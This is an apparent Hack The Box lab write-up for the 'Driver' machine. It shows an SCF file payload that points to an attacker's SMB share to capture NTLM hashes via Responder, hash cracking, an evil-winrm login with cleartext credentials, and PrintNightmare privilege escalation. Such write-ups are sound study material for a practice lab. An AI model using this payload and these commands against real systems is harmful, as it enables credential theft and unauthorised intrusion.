# ***Hack The Box: Driver Write-Up***



**ENUMERATION:**

Firstly, we perform an NMap scan on the target.
![](https://i.imgur.com/rNscbHF.png)

Trying to access the site we are met with a pop up screen. admin:admin allowed us access.
![](https://i.imgur.com/Clh2q50.png)
![](https://i.imgur.com/lV0LMb1.png)

Looks like we can submit our own files.
After searching for exploits I found out we can perform a SCF(Shell Command Files) file attack.




---
[Shell]
Command=2
IconFile=\\10.10.14.101\share\test.ico
[Taskbar]
Command=ToggleDesktop
---

I saved this file as @exploit.scf and uploaded it after starting a responder
![](https://i.imgur.com/aUji3dz.png)
![](https://i.imgur.com/CIMngb5.png)

We crack this NTML hash using hashcat and gain access using evil winrm.




---

evil-winrm -u Tony -p liltony -i 10.10.11.106

---

![](https://i.imgur.com/TQfWEnd.png)



**Privelege Escalation**

We know there is a printer service so we try printnightmare.
[https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html](https://)

We upload the malware:


![](https://i.imgur.com/G2alCsN.png)


By default we can't import the module so we modify the execution policy of the current user and then import it. After that we create a new user using the invoke nightmare command.


![](https://i.imgur.com/h49ww9f.png)


We run evil-winrm again and as we can see we have access to the Administrator user.

![](https://i.imgur.com/Tv1PupR.png)















